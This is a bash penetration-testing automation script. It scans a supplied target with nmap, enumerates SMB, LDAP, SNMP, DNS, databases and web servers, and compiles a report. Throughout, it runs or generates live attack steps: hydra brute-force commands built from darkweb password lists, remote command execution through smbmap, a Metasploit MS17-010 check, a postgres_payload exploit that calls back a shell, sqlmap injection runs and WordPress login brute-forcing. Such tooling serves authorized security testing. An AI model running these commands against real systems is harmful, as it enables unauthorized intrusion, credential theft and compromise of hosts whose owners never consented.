# Env Setup
  dir=`pwd`
  date=`date +%d-%m-%y`
  target=$(echo $1 | cut -d "/" -f 3)
  userlist=~/Tools/SecLists/Usernames/top-usernames-shortlist.txt
  passlist=~/Tools/SecLists/Passwords/darkweb2017-top100.txt
  line="\n=====================\n"
  mkdir -p scans
  cd scans
  mkdir -p $target
  cd $target
  mkdir nmap-tcp
  mkdir nmap-udp

# Report generation
  echo "------------------------------------------------------" | tee report-$target.txt
  echo "# Scan report for $target" |tee -a report-$target.txt
  echo "------------------------------------------------------" | tee -a report-$target.txt

# Discover services
  echo "\n## Nmap Scan for $target ...\n" | tee -a report-$target.txt
  ports=$(nmap -Pn $2 --min-rate=1000 -T4 $target | grep "^[0-9]" | cut -d '/' -f 1 | tr  '\n' ',' | sed s/,$//)
  echo "\n### Open Ports:\n";for i in $(echo $ports | sed 's/,/\n/g'); do echo $target:$i; done | tee -a ports-$target.txt
  echo "\n"
  nmap -Pn -sC -sV -p $ports $target -oN nmap-tcp/$target
  cat nmap-tcp/* >> report-$target.txt


# nmap udp scan
  echo "\n## Nmap UDP ...\n" | tee -a report-$target.txt
  ports=$(sudo nmap -Pn $3 -sU --min-rate=5000 --open -T4 $target | grep "^[0-9]" | cut -d '/' -f 1 | tr  '\n' ',' | sed s/,$//)
  sudo nmap -Pn -sUVC --open -p $ports $target --defeat-icmp-ratelimit --max-retries 3 -oN nmap-udp/$target
#  sudo nmap -sUVC --open $target --top-ports 200 -oN nmap-udp/$target
  cat nmap-udp/* >> report-$target.txt

# get services
  cd nmap-tcp/
  grep -Hari "/tcp" | grep -v ":|" | grep -v " closed " >> ../services-$target.txt
  if grep -qE "closed" "*"; then
  echo "\n## Closed Ports ...\n" | tee -a ../report-$target.txt
  grep -Hari " closed " | tee -a ../report-$target.txt
  fi
  cd ../
  cd nmap-udp/
  grep -Hari "/udp" | grep -vE "closed|filtered" >> ../services-$target.txt
  cd ../
  echo "\n## Services ...\n" | tee -a report-$target.txt
  cat services-$target.txt | tee -a report-$target.txt
  cat services-$target.txt >> $dir/services.txt
  echo "\n## Ports ...\n" | tee -a report-$target.txt
  cat ports-$target.txt | tee -a report-$target.txt
  mv nmap-tcp/$target nmap-tcp-$target.txt
  mv nmap-udp/$target nmap-udp-$target.txt
  cat services-$target.txt | grep -E "ssl|https" | cut -d '/' -f 1 | tee -a ssl-ports-$target.txt
  /bin/rm -rf nmap-udp
  /bin/rm -rf nmap-tcp

# HTTP Discovery
  echo "\n## Webservers\n"
  echo $target | httprobe | tee -a webservers-$target.txt
  cat ports-$target.txt |grep -vE ":80$|:443$" | httprobe | tee -a webservers-$target.txt
  cat webservers-$target.txt | sort -u -o webservers-$target.txt
  cat webservers-$target.txt >> $dir/webservers.txt


# Specific Service Scans
############################################
# Checklist template echo "- Try dir traversal" >> report-$target.txt
# ftp scans
  if grep -qE "ftp" "services-$target.txt"; then
  echo "\n## FTP Services Found:\n" | tee -a report-$target.txt
  echo "- Grab FTP Banner via telnet  telnet -n $target 21" | tee -a report-$target.txt
  echo "- Grab FTP Certificate if existing  openssl s_client -connect $target:21 -starttls ftp" | tee -a report-$target.txt
  echo "- Anon login and bounce FTP checks are performed  nmap --script ftp-* -p 21 $target" | tee -a report-$target.txt
  echo "- Connect with Browser  #ftp://anonymous:anonymous@$target" | tee -a report-$target.txt
  echo "- Need Username hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV $target ftp" | tee -a report-$target.txt
  echo "- Try dir traversal" >> report-$target.txt
  nmap -Pn -p 21 --script=ftp-anon.nse,ftp-bounce.nse,ftp-libopie.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse $target | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 21 -o ftp-brute-$target.txt ftp://$target" >> commands-$target.sh
  fi

# ssh scans
  if grep -qE ":22/tcp" "services-$target.txt"; then
  echo "\n## SSH Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep ssh | tee -a report-$target.txt
  echo "- Bruteforce" >> report-$target.txt
  echo "- Username Enum" >> report-$target.txt
  echo "- Report password based authentication" >> report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -t 4 -s 22 -o ssh-brute-$target.txt ssh://$target" >> commands-$target.sh
  nmap -Pn -p 22 --script=ssh2-enum-algos,sshv1,ssh-hostkey $target | tee -a report-$target.txt
  fi

# telnet scans
  if grep -qE ":23/tcp" "services-$target.txt"; then
  echo "\n## Telnet Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep telnet | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 23 -o telnet-brute-$target.txt telnet://$target" >> commands-$target.sh
  nmap -n -sV -Pn --script '*telnet*' -p 23 $target | tee -a report-$target.txt
  fi

# imap
  if grep -qE ":143/tcp" "services-$target.txt"; then
  echo "\n## Imap Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep ":143/tcp" | tee -a report-$target.txt
  echo "- Banner Grab 143 nc -nv $target 143" | tee -a report-$target.txt
  echo "- Banner Grab 993 openssl s_client -connect $target:993 -quiet" | tee -a report-$target.txt
  fi

# pop3
  if grep -qE ":110/tcp" "services-$target.txt"; then
  echo "\n## POP Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep ":110/tcp" | tee -a report-$target.txt
  echo "- Banner Grab 110 nc -nv $target 110" | tee -a report-$target.txt
  echo "- Grab Banner Secure  openssl s_client -connect $target:995 -crlf -quiet" | tee -a report-$target.txt
  echo "- Scan for POP info nmap --script 'pop3-capabilities or pop3-ntlm-info' -sV -p 110 $target" | tee -a report-$target.txt
  echo "- Need User hydra -l {Username} -P {Big_Passwordlist} -f $target pop3 -V" | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 110 -o pop3-brute-$target.txt pop3://$target" >> commands-$target.sh
  fi

# SMB Scans
  if grep -qE ":445/tcp|:139/tcp|:111/tcp" "services-$target.txt"; then
  echo "\n## SMB Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":445/tcp|:139/tcp|:111/tcp" | tee -a report-$target.txt
  echo "hydra -l Administrator -P $passlist -e nsr -s 445 -o smb-admin-brute-$target.txt smb://$target" >> commands-$target.sh
  echo "\n### NBTscan:\n" | tee -a report-$target.txt
  nbtscan $target | tee -a report-$target.txt
  echo "\n### Showmount:\n" | tee -a report-$target.txt
  showmount -e $target 2>&1 | tee -a report-$target.txt
  echo "\n### Enum4Linux:\n" | tee -a report-$target.txt
  perl ~/Tools/enum4linux/enum4linux.pl -a -M -l -d $target 2>&1 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a report-$target.txt
  echo "\n### RPCClient:\n" | tee -a report-$target.txt
  rpcclient -p 111 -U "" $target | tee -a report-$target.txt
  rpcclient -p 135 -U "" $target | tee -a report-$target.txt
  rpcclient -p 2103 -U "" $target | tee -a report-$target.txt
  rpcclient -p 2105 -U "" $target | tee -a report-$target.txt
  echo "\n### Smbclient:\n" | tee -a report-$target.txt
  smbclient -L\\ -N -I $target 2>&1 | tee -a report-$target.txt
  echo "\n### SMBmap:\n" | tee -a report-$target.txt
  smbmap -H $target -P 139 2>&1 | sed "s/\^M//" | grep -v "Working" |tee -a report-$target.txt
  smbmap -H $target -P 139 -R 2>&1 | sed "s/\^M//" | grep -v "Working" |tee -a report-$target.txt
  smbmap -H $target -P 445 2>&1 |sed "s/\^M//" | grep -v "Working" |tee -a report-$target.txt
  smbmap -H $target -P 445 -R 2>&1 |sed "s/\^M//"  | grep -v "Working" |tee -a report-$target.txt
  smbmap -H $target -P 139 -x "ipconfig /all" 2>&1 | grep -v "Working" |sed "s/\^M//" | tee -a report-$target.txt
  echo "\n### MS17-Scan:\n" | tee -a report-$target.txt
  msfconsole -qx "color false;use auxiliary/scanner/smb/smb_ms17_010; set rhosts $target;run; exit -y" | tee -a report-$target.txt
  echo "\n### Nmap SMB Vuln Scan:\n" | tee -a report-$target.txt
  sudo nmap -Pn -p 135,139,445 -sSV --script=smb-vuln*,smb-enum* $target | tee -a report-$target.txt
  fi

# ldap scans
  if grep -qE ":389/tcp|:636/tcp" "services-$target.txt"; then
  echo "\n## LDAP Services found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":389/tcp|:636/tcp" | tee -a report-$target.txt
  echo "- Grab LDAP Banner  nmap -p 389 --script ldap-search -Pn $target" | tee -a report-$target.txt
  echo "- Base LdapSearch ldapsearch -h $target -x" | tee -a report-$target.txt
  echo "- Attempt to get LDAP Naming Context  ldapsearch -h $target -x -s base namingcontexts" | tee -a report-$target.txt
  echo "- Need Naming Context to do big dump  ldapsearch -h $target -x -b '{Naming_Context}'" | tee -a report-$target.txt
  echo "- Need User hydra -l {Username} -P {Big_Passwordlist} $target ldap2 -V -f" | tee -a report-$target.txt
  ldapsearch -LLL -x -H ldap://$target -b '' -s base '(objectclass=*)' | tee -a report-$target.txt
  fi

# smtp
  if grep -qE ":25/tcp" "services-$target.txt"; then
  echo "\n## SMTP Services found...\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":25/tcp" | tee -a report-$target.txt
  echo "- Grab SMTP Banner  nc -vn $target 25" | tee -a report-$target.txt
  echo "- SMTP Vuln Scan With Nmap  nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $target" | tee -a report-$target.txt
  echo "- Enumerate uses with smtp-user-enum  smtp-user-enum -M VRFY -U {Big_Userlist} -t $target" | tee -a report-$target.txt
  echo "- Attempt to connect to SMTPS two different ways  openssl s_client -crlf -connect $target:465 &&&& openssl s_client -starttls smtp -crlf -connect $target:587" | tee -a report-$target.txt
  echo "- Find MX servers of an organization  dig +short mx {Domain_Name}" | tee -a report-$target.txt
  echo "- Need Nothing  hydra -P {Big_Passwordlist} $target smtp -V" | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 25 -o smtp-brute-$target.txt smtp://$target" | tee -a report-$target.txt>> commands-$target.sh
  smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -t $target -p 25 2>&1 | tee -a report-$target.txt
  sudo nmap -Pn -p 25 -sSV --script=smtp-commands.nse,smtp-enum-users.nse,smtp-ntlm-info.nse,smtp-open-relay.nse,smtp-strangeport.nse,smtp-vuln-cve2010-4344.nse,smtp-vuln-cve2011-1720.nse,smtp-vuln-cve2011-1764.nse $target | tee -a report-$target.txt
  fi

# dns scans
  if grep -qE ":53/tcp|:53/udp" "services-$target.txt"; then
  echo "\n## DNS Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":53/tcp|:53/udp" | tee -a report-$target.txt
  echo "- Grab DNS Banner dig version.bind CHAOS TXT @DNS" | tee -a report-$target.txt
  echo "- Scan for Vulnerabilities with Nmap  nmap -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' $target" | tee -a report-$target.txt
  echo "- Three attempts at forcing a zone transfer dig axfr @$target && dix axfr @$target {Domain_Name} && fierce -dns {Domain_Name}" | tee -a report-$target.txt
  echo "- Eunuerate a DC via DNS  dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args 'dns-srv-enum.domain={Domain_Name}'" | tee -a report-$target.txt
  sudo nmap -Pn -sSV -p 53 --script=dns* $target | tee -a dns-$target.txt
  #sudo nmap -Pn -sU -p 53 --script=dns* $target | tee -a dns-$target.txt
  echo "### Zone Transfer:" | tee -a dns-$target.txt
  dig +short ns $target | tee -a dns-$target.txt
  cat dns-$target.txt >> report-$target.txt
  fi

# DC scans
  if grep -qE "88/tcp" "services-$target.txt"; then
  echo "\n## Domain Controller Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":88/tcp" | tee -a report-$target.txt
  echo "- Brute Force to get Usernames  nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='{Domain_Name}',userdb={Big_Userlist} $target" | tee -a report-$target.txt
  echo "- Brute Force with Usernames and Passwords  #consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h" | tee -a report-$target.txt
  echo "- Attempt to get a list of user service principal names GetUserSPNs.py -request -dc-ip $target active.htb/svc_tgs" | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 3389 -o rdp-brute-$target.txt rdp://$target" >> commands-$target.sh
  fi

# mysql scans
  if grep -qE ":3306/tcp" "services-$target.txt"; then
  echo "\n## MySQL Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":3306/tcp" | tee -a report-$target.txt
  echo "- Nmap with MySql Scripts nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse $target -p 3306" | tee -a report-$target.txt
  echo "- Attempt to connect to mysql server  mysql -h $target -u {Username}@localhost" | tee -a report-$target.txt
  echo "msfconsole -qx \"use auxiliary/scanner/mysql/mysql_login; set RHOSTS $target; set USERNAME root ;set PASS_FILE ~/Tools/SecLists/Passwords/darkweb2017-top100.txt; set USER_AS_PASS true; set BLANK_PASSWORDS true; set VERBOSE false ;run; exit -y\" | tee -a loginbrute.txt" | tee -a report-$target.txt
  echo "mysql -h $target -u root -p " | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 3306 -o mysql-brute-$target.txt mysql://$target" >> commands-$target.sh
  fi

# MSSQL scans
  if grep -qE "1433/tcp" "services-$target.txt"; then
  echo "\n## MSSQL Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":1433/tcp" | tee -a report-$target.txt
  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $target | tee -a report-$target.txt
  fi 

# rdp scans
  if grep -qE "3389/tcp" "services-$target.txt"; then
  echo "\n## RDP Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":3389/tcp" | tee -a report-$target.txt
  echo "- Check for bluekeep" | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 3389 -o rdp-brute-$target.txt rdp://$target" >> commands-$target.sh
  nmap --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' -p 3389 -T4 $target | tee -a report-$target.txt
  fi

# postgresql scans
  if grep -qE ":5432/tcp" "services-$target.txt"; then
  echo "\n## PostGRESql Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":5432/tcp" | tee -a report-$target.txt
  echo "msfconsole -qx \"use exploit/linux/postgres/postgres_payload; set rhosts $target; set lhost tun0; run; exit -y\" | tee -a loginbrute.txt" | tee -a report-$target.txt
  echo "hydra -L $userlist -P $passlist -e nsr -s 5432 -o postgres-brute-$target.txt postgres://$target" >> commands-$target.sh
  fi

# vnc scans
  if grep -qEi "vnc" "services-$target.txt"; then
  echo "\n## VNC Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -iE "vnc" | tee -a report-$target.txt
  echo "- Test for weak creds" | tee -a report-$target.txt
  echo "hydra -P $passlist -e nsr -s 5900 -o vnc-brute-$target.txt vnc://$target" | tee -a report-$target.txt | tee -a commands-$target.sh

  nmap -Pn -p 5800,5900 --script=realvnc-auth-bypass.nse,vnc-info.nse,vnc-title.nse $target | tee -a report-$target.txt
  fi

# Oracle scans
  if grep -qEi "oracle" "services-$target.txt"; then
  echo "\n## Oracle Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -iE "oracle" | tee -a report-$target.txt
  echo "- Run all odat commands" | tee -a report-$target.txt
  echo "nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=oracl $target" | tee -a report-$target.txt
  echo "python3 odat.py sidguesser -s $target" | tee -a report-$target.txt
  echo "python3 odat.py passwordguesser -d {SID} -s $target -p 1521 --accounts-file accounts/accounts_multiple.txt" >> report-$target.txt
  echo "python3 odat.py all -d $i -s $target -p 1521" >> report-$target.txt
  nmap -Pn --script=oracle-sid-brute -p 1521-1560 $target | tee -a report-$target.txt
  fi

# snmp scans
  if grep -qE ":161/udp" "services-$target.txt"; then
  echo "\n## SNMP Services Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -E ":161/udp" | tee -a report-$target.txt
  echo "- Enumerate SNMP  snmp-check $target" | tee -a report-$target.txt
  echo "- Crack SNMP passwords  onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $target -w 100" | tee -a report-$target.txt
  echo "- Nmap snmp (no brute)  nmap --script 'snmp* and not snmp-brute' $target" | tee -a report-$target.txt
  echo "- Need Nothing  hydra -P {Big_Passwordlist} -v $target snmp" | tee -a report-$target.txt
  # Nmap Recon
  sudo nmap -Pn -sUV -p 161 --script=snmp-hh3c-logins.nse,snmp-info.nse,snmp-interfaces.nse,snmp-ios-config.nse,snmp-netstat.nse,snmp-processes.nse,snmp-sysdescr.nse,snmp-win32-services.nse,snmp-win32-shares.nse,snmp-win32-software.nse,snmp-win32-users.nse $target -oN nmap-snmp-$target.txt | tee -a report-$target.txt
  # snmp check
  snmp-check $target | tee -a $snmp-check-$target.txt | tee -a report-$target.txt
  #snmpwalk
  snmpwalk -v 1 -c public $target | tee -a snmp-walk-$target.txt | tee -a report-$target.txt
  #snmpcheck
  fi

# HTTP Service scans
  if grep -qE "http" "webservers-$target.txt"; then
  echo "\n## Webservers Found:\n" | tee -a report-$target.txt
  cat services-$target.txt | grep -Ei "http" | tee -a report-$target.txt
  cat webservers-$target.txt >> report-$target.txt
  echo "\n### Checklist:\n" | tee -a report-$target.txt
  echo "- Nikto" | tee -a report-$target.txt
  echo "- Burp / ZAP Scan" | tee -a report-$target.txt
  echo "- VHOST Discovery" | tee -a report-$target.txt
  echo "- Subdomain Bruteforce" | tee -a report-$target.txt
  echo "- Check for SSL Certiifcate domains" | tee -a report-$target.txt
  echo "- Exchange server checks" | tee -a report-$target.txt
  echo "- Directory Enumeration" | tee -a report-$target.txt
  echo "- Whatweb" | tee -a report-$target.txt
  echo "- Basic OWASP top 10 check" | tee -a report-$target.txt
  echo "- Drupal Enumeration" | tee -a report-$target.txt
  echo "- WordPress Enumeration" | tee -a report-$target.txt
  echo "- Login Bruteforce" | tee -a report-$target.txt
  echo "- Default Credentials" | tee -a report-$target.txt
  echo "- BreachData Credentials" | tee -a report-$target.txt
  echo "- Check for Jenkins / tomcat etc" | tee -a report-$target.txt
  
  echo "\n### All Headers ...\n" | tee -a report-$target.txt
  for i in $(cat webservers-$target.txt)
  do
  echo "$i\n----" | tee -a http-headers-$target.txt
  curl -sk -sSL -D - $i -o /dev/null | tee -a http-headers-$target.txt
  done
  cat http-headers-$target.txt >> report-$target.txt

  # whatweb
  echo "\n### Whatweb:\n" | tee -a report-$target.txt
  for i in $(cat webservers-$target.txt)
  do
  whatweb $i --color never | tee -a whatweb-$target.txt
  echo "\n" | tee -a whatweb-$target.txt
  done
  cat whatweb-$target.txt | grep "^http" >> report-$target.txt
  /bin/rm whatweb-$target.txt

  # spider
  echo "\n### Spider:\n" | tee -a report-$target.txt
  for i in $(cat webservers-$target.txt)
  do
  gospider -d 4 -s $i | grep $target | tee -a gospider-$target.txt
  echo $i | hakrawler -d 4 | grep $i | sort -u >> urls-$target.txt
  echo $i | getallurls | grep $i | sort -u >> urls-$target.txt
  cat gospider-$target.txt | grep -E "\[url\]" | cut -d ' ' -f 5- | sort -u >> urls-$target.txt
  cat urls-$target.txt | grep "=" | urldedupe | grep -vE ".woff|.css|.gif|.jpeg|.png|.jpg|.js"  >> parameters-$target.txt
  echo $i | getallurls | grep $i
  done
  cat gospider-$target.txt | sort -u | tee -a report-$target.txt
  echo "\n### Parameters:\n" | tee -a report-$target.txt
  cat parameters-$target.txt | tee -a report-$target.txt

  # directory & zap scans
  for i in $(cat webservers-$target.txt)
  do
  echo "gobuster dir -b 301,302,303,400,404,401,403 -k -u $i -w  ~/Tools/SecLists/Discovery/Web-Content/common.txt -q -e -o gobuster-directories-$(echo $i | cut -d '/' -f 3)-$target.txt" >> commands-$target.sh
  echo "feroxbuster -u $i -t 10 -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -C 401,403,404 -r -q -o feroxbuster-directories-$(echo $i | cut -d '/' -f 3)-$target.txt" >> commands-$target.sh
  echo "ffuf -u \"$i/FUZZ\" -H \"User-Agent: Firefox\" -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -mc 200,204,403,401,500,501,502 -of csv -o ffuf-directories-$(echo $i | cut -d '/' -f 3)-$target.txt" >> commands-$target.sh
  echo "docker run --rm -v \$(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t \"$i\" -g gen.conf -w zap-md-$(echo $i | cut -d '/' -f 3)-$target.txt -r zap-html-$(echo $i | cut -d '/' -f 3)-$target.html -J zap-json-$(echo $i | cut -d '/' -f 3)-$target.json; /bin/rm gen.conf" >> commands-$target.sh
  echo "sqlmap -m parameters-$target.txt --batch --answers='keep testing=Y,sitemap=Y,skip further tests=N' --random-agent | tee -a sqlmap-logs-$target.txt" >> commands-$target.sh
  echo "sqlmap -u $i --forms --batch --crawl=10 | tee -a sqlmap-logs-$target.txt" >> commands-$target.sh
  echo "nikto -h $i -ask no  --maxtime 5m | tee -a nikto-$target.txt" >> commands-$target.sh
  done

  # nuclei
  echo "\n### Nuclei:\n" | tee -a report-$target.txt
  ~/go/bin/nuclei -l webservers-$target.txt --system-resolvers -nc -nts -silent |  sort -h | tee -a vulnscan-$target.txt
  cat vulnscan-$target.txt >> report-$target.txt

  if grep -qE "wordpress" "report-$target.txt"; then echo "\n## Wordpress Detected\n" | tee -a report-$target.txt
    for i in $(cat report-$target.txt| grep wordpress-detect | cut -d ' ' -f 4 | cut -d '/' -f 1,2,3)
    do
    wpscan --url $i -f cli-no-colour -e u | tee -a report-$target.txt
    echo "### Bruteforce Usernames\n" | tee -a report-$target.txt
    echo "ffuf -u $i/wp-login.php -X POST -d \"log=FUZZ&pwd=asdf&wp-submit=Log+In&redirect_to=$i%2Fwp-admin%2F&testcookie=1\" -fr \"Invalid username\" -w ~/Tools/SecLists/Discovery/SNMP/snmp.txt --cookie \"wordpress_test_cookie=WP+Cookie+check\" -H \"Content-Type: application/x-www-form-urlencoded\"" >> commands-$target.sh
    echo "### Bruteforce Passwords\n" | tee -a report-$target.txt
    echo "wpscan --url $i --passwords ~/Tools/SecLists/Passwords/xato-net-10-million-passwords-1000.txt --usernames USERNAME" >> commands-$target.sh
    done
  fi

# End Web Checks
fi



## SSL Tests
echo "\n## SSL Test:\n" | tee -a report-$target.txt
~/Tools/testssl.sh/testssl.sh --openssl-timeout 3 --csv --file ssl-ports-$target.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a sslscan.txt > /dev/null
cat *.csv | sed 's/\"//g' | sort -h >> ssl-$target.txt 2> /dev/null
cat *.csv | sed 's/\"//g' | sort -h | grep -E "OCSP|CRITICAL|HIGH|MEDIUM|LOW" | sort -h | tee -a report-$target.txt 2> /dev/null
echo "#### OCSP Stapling\n" | tee -a report-$target.txt
cat sslscan.txt | grep -E "Start|OCSP" | sed 's/^ //g' | tee -a report-$target.txt
/bin/rm *.csv 2> /dev/null

# Command Generation
echo "\n### Further Commands to Run:\n" | tee -a report-$target.txt
cat commands-$target.sh | sort -u -o commands-$target.sh
cat commands-$target.sh | grep -v hydra >> commands.tmp
cat commands-$target.sh | grep hydra >> commands.tmp
cat commands.tmp > commands-$target.sh
/bin/rm commands.tmp
chmod +x commands-$target.sh
cat commands-$target.sh | tee -a report-$target.txt
cat commands-$target.sh >> $dir/commands.sh; chmod +x $dir/commands.sh

echo "\n## Checklist:\n" | tee -a report-$target.txt
echo "- All software versions checked for vulns" | tee -a report-$target.txt
echo "- All services connected to with browser / nc or relevant tools" | tee -a report-$target.txt

echo "\n## Report Checklist:\n" | tee -a report-$target.txt
# Template: if grep -qE "MATCHER" "report-$target.txt"; then echo "$target - VULN: $(cat report-$target.txt | grep MATCHER | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "tls10" "report-$target.txt"; then echo "$target - TLS 1.0 Found $(cat report-$target.txt | grep tls10 | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "self-signed-ssl" "report-$target.txt"; then echo "$target - Self Signed SSL Certificate $(cat report-$target.txt | grep self-signed-ssl | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "SSLv3" "report-$target.txt"; then echo "$target - SSLv3 Found: $(cat report-$target.txt | grep SSLv3 | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "POODLE_SSL" "report-$target.txt"; then echo "$target - POODLE Found: $(cat report-$target.txt | grep POODLE_SSL | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "RC4" "report-$target.txt"; then echo "$target - RC4 Found: $(cat report-$target.txt | grep RC4 | grep VULNERABLE | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "SWEET32" "report-$target.txt"; then echo "$target - Sweet32 Found: $(cat report-$target.txt | grep SWEET32 | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "TLS1_1," "report-$target.txt"; then echo "$target - TLS 1.1 Found: $(cat report-$target.txt | grep TLS1_1 | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "http-missing-security-headers:content-security-policy" "report-$target.txt"; then echo "$target - Missing Header: Content-Security-Policy $(cat report-$target.txt | grep 'http-missing-security-headers:content-security-policy' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "http-missing-security-headers:strict-transport-security" "report-$target.txt"; then echo "$target - Missing Header: HSTS/Strict-Transport-Security $(cat report-$target.txt | grep 'http-missing-security-headers:strict-transport-security' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "http-missing-security-headers:x-content-type-options" "report-$target.txt"; then echo "$target - Missing Header: X-Content-Type-Options $(cat report-$target.txt | grep 'http-missing-security-headers:x-content-type-options' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "http-missing-security-headers:x-frame-options" "report-$target.txt"; then echo "$target - Missing Header: X-Frame-Options $(cat report-$target.txt | grep 'http-missing-security-headers:x-frame-options' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "smb-v1-detect" "report-$target.txt"; then echo "$target - SMB v1 Found: $(cat report-$target.txt | grep 'smb-v1-detect' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "basic-auth-detection" "report-$target.txt"; then echo "$target - Basic Authentication Found: $(cat report-$target.txt | grep 'basic-auth-detection' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "Host is likely VULNERABLE to MS17-010" "report-$target.txt"; then echo "$target - MS17-010 Found: $(cat report-$target.txt | grep 'Host is likely VULNERABLE to MS17-010' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi
if grep -qE "Anonymous FTP login allowed" "report-$target.txt"; then echo "$target - Anonymous FTP: $(cat report-$target.txt | grep 'Anonymous FTP login allowed' | tr '\n' ',')" | tee -a $dir/reportchecklist.txt | tee -a report-$target.txt; fi

cat report-$target.txt | sed 's/\r//g' | sed 's/^|_/ /g' | sed 's/^| / /g' > report-$target.tmp
mv report-$target.tmp report-$target.txt
echo "# $target Scans Complete, review report..........."
cat report-$target.txt >> $dir/reports.txt
echo "\n" >> $dir/reports.txt
